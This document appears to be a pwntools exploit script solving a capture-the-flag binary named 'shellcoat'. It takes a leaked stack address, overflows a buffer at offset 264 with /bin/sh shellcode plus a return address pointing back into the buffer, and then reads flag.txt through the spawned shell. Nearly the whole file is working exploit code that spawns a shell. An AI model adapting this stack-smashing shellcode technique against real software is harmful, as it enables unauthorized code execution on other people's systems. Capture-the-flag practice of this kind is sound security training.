from pwn import *

context.terminal = ['gnome-terminal', '--', 'bash', '-c']
elf = context.binary = ELF('../public/shellcoat')

remote_addr = args.REMOTE_ADDR or 'localhost'
remote_port = args.REMOTE_PORT or 1337

if args.LOCAL:
    if args.LOCAL and not args.NO_GDB:
        r = gdb.debug('../public/shellcoat', '''
            b main
        ''')
    else:
        r = process()
else:
    r = remote(remote_addr, remote_port)

r.recvuntil('I think I left my coat around ')
buf_leak = int(r.recvline().strip(), 16)

print(f"Buffer is at {hex(buf_leak)}")

shellcode = asm(shellcraft.sh())

# payload = cyclic(1024)
# offset = cyclic_find('qaacraac')
offset = 264

# Add padding (this doesn't even need to be nops since it's after the shellcode, but it was like this since I was testing rjust before - but the end of the shellcode was getting corrupted due to that part of the stack being used for other stuff probably)
payload = shellcode.ljust(264, asm('nop'))
# Jump to the beginning of the buffer
payload += p64(buf_leak)

r.sendline(payload)

# print(r.clean())
# r.interactive()
r.sendline('cat flag.txt')
r.sendline('exit')

flag = r.recvall().decode().strip()
print(flag)

r.close()
